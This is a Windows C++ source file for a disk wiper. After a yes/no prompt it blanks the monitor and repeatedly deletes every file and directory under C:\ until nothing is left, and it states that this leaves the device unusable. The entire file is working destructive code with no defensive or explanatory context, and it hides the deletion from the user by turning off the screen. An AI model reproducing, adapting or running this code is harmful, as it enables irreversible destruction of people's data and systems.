#include <iostream>
#include <string>
#include <filesystem>
#include <windows.h>

void set_screen_sleep() {
    SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM)2);
}

void delete_all_files(const std::string& path) {
    try {
        for (const auto& entry : std::filesystem::recursive_directory_iterator(path)) {
            try {
                if (entry.is_regular_file()) {
                    std::filesystem::remove(entry.path());
                    std::cout << "Deleted : " << entry.path() << std::endl;
                } else if (entry.is_directory()) {
                    std::filesystem::remove_all(entry.path());
                    std::cout << "Directory deleted : " << entry.path() << std::endl;
                }
            } catch (const std::exception& e) {
                std::cout << "Error while deleting : " << entry.path() << ": " << e.what() << std::endl;
            }
        }
    } catch (const std::exception& e) {
        std::cout << "Error while trying to access the directory : " << path << ": " << e.what() << std::endl;
    }
}

int main() {
    std::cout << "The program will try to delete **ALL THE FILES** on this partition. This action will make the device unusable." << std::endl;
    std::cout << "Are you really sure ? (Y/N): ";
    
    char confirmation;
    std::cin >> confirmation;

    if (confirmation == 'Y' || confirmation == 'y') {
        set_screen_sleep();

        std::string root_path = "C:\\";

        while (true) {
            bool deletedAnyFile = false;

            delete_all_files(root_path);

            set_screen_sleep();

            Sleep(1000);

            deletedAnyFile = false;
            for (const auto& entry : std::filesystem::recursive_directory_iterator(root_path)) {
                deletedAnyFile = true;
                break;
            }

            if (!deletedAnyFile) {
                std::cout << "Everything has been deleted..." << std::endl;
                break;
            }
        }
    } else {
        std::cout << "Operation canceled. No modification has been done." << std::endl;
    }

    return 0;
}
